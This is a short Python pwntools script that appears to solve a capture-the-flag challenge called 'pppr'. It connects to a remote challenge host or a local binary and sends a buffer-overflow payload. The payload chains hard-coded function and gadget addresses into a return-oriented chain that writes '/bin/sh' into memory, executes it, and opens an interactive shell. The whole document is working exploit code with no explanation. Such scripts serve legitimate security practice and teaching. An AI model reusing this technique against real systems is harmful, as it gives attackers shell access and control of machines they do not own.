from pwn import *

if __debug__:
	r = process("./pppr")
else:
	r = remote("pppr.sstf.site", 1337)

buf_addr = 0x0804a040
r_addr = 0x08048526
x_addr = 0x080485b4
pppr = 0x080486a9

payload = b"A" * 8 + b"BBBB"
payload += p32(r_addr)
payload += p32(pppr)
payload += p32(buf_addr)
payload += p32(16)
payload += p32(0)
payload += p32(x_addr)
payload += p32(0)
payload += p32(buf_addr)
payload += b"\n/bin/sh"
r.sendline(payload)

r.interactive()
